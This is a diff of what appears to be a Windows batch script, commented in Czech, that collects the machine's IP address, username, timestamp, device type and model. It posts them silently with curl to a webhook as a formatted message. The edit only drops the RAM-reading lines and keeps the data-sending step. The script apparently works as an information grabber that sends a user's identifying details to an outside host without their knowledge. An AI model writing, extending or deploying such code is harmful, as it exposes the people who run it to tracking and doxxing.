@@ -41,12 +41,8 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
     )
 )
 
-:: 🧠 RAM
-for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
-set /a ram=%ramRaw:~0,-6%
-
 :: 🧾 Hezky formátovaná zpráva s || kolem IP
-set "msg=🛰️ **Systémové info**\n||IP: !ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!\nRAM: !ram! GB"
+set "msg=🛰️ **Systémové info**\n||IP: !ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!"
 
 :: 📤 Odeslání na webhook
 curl -s -X POST %webhook% -d "content=!msg!" >nul
